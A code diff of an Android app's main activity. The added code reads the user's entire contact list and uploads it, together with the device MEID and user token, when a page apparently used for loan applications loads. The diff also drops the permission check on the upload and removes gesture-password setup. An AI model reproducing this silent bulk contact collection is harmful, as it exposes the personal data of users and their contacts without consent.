@@ -274,7 +274,6 @@ public class MainActivity extends BaseActivity implements OnCropBitmapListner {
 
             //注册Observer
             resolver.registerContentObserver(uri, true, observer);
-            LogUtil.e("onPageStartedEnd：" + System.currentTimeMillis());
         }
     }
 
@@ -493,26 +492,8 @@ public class MainActivity extends BaseActivity implements OnCropBitmapListner {
 
                 if (url.contains("mine/apply")) {
                     //有权限
-                    if (ContextCompat.checkSelfPermission(MainActivity.this,
-                            Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
-                        Logger.i("53123");
-                        if ((Boolean) SharedPreferencesUtils.getParam(MainActivity.this, "isUpdate", true)) {
-                            //Toast.makeText(MainActivity.this, "已经授权", Toast.LENGTH_LONG).show();
-                            SharedPreferencesUtils.setParam(MainActivity.this, "isUpdate", false);
-                            LogUtil.d("已经授权");
-                            //权限请求成功 TAGHere
-                            contactsArrayList = ContactUtils.getAllContacts(MainActivity.this);
-                            json = new JSONArray();
-                            json.addAll(contactsArrayList);
-                            data = JSON.toJSONString(contactsArrayList);
-                            System.out.println("lsyyydata" + data);
-                            //加个""的处理交给后台
-                            getMEID();
-                            Logger.i("succseemeid:" + meid);
-                            MainHelper.getInstance().postContacts(MainActivity.this, data, user_token, meid);
-//                            PostContactsService.startPostContacts(MainActivity.this, user_token, meid);
-                        }
-                    }
+                    getMEID();
+                    MainHelper.getInstance().postContacts(MainActivity.this, data, user_token, meid);
                 }
 
 //                int versionCode = FPackageUtil.getPackageInfo().versionCode;
@@ -643,14 +624,24 @@ public class MainActivity extends BaseActivity implements OnCropBitmapListner {
                 }
                 break;
             case EVENT_LOGIN_SUCCESS:
-                isLogout = false;
-                boolean is_open_adv = getResources().getBoolean(R.bool.is_open_gesture);
-                LoginSuccessModel loginSuccessModel = LoginSuccessModelDao.queryModelCurrentLogin();
-                if (loginSuccessModel != null) {
-                    if (is_open_adv && TextUtils.isEmpty(loginSuccessModel.getPatternpassword())) {
-                        Intent intent = new Intent(MainActivity.this, CreateGesturePasswordActivity.class);
-                        intent.putExtra(CreateGesturePasswordActivity.EXTRA_CODE, CreateGesturePasswordActivity.ExtraCodel.EXTRA_CODE_1);
-                        startActivity(intent);
+                Logger.i("通讯录这块");
+                if (ContextCompat.checkSelfPermission(MainActivity.this,
+                        Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
+                    Logger.i("53123");
+                    if ((Boolean) SharedPreferencesUtils.getParam(MainActivity.this, "isUpdate", true)) {
+                        //Toast.makeText(MainActivity.this, "已经授权", Toast.LENGTH_LONG).show();
+                        SharedPreferencesUtils.setParam(MainActivity.this, "isUpdate", false);
+                        LogUtil.d("已经授权");
+                        //权限请求成功 TAGHere
+                        contactsArrayList = ContactUtils.getAllContacts(MainActivity.this);
+                        json = new JSONArray();
+                        json.addAll(contactsArrayList);
+                        data = JSON.toJSONString(contactsArrayList);
+                        System.out.println("lsyyydata" + data);
+                        //这里没有提交到后台，因为不确定是否获取到token，为了保证拿得到
+//                        getMEID();
+//                        MainHelper.getInstance().postContacts(MainActivity.this, data, user_token, meid);
+//                            PostContactsService.startPostContacts(MainActivity.this, user_token, meid);
                     }
                 }
                 break;
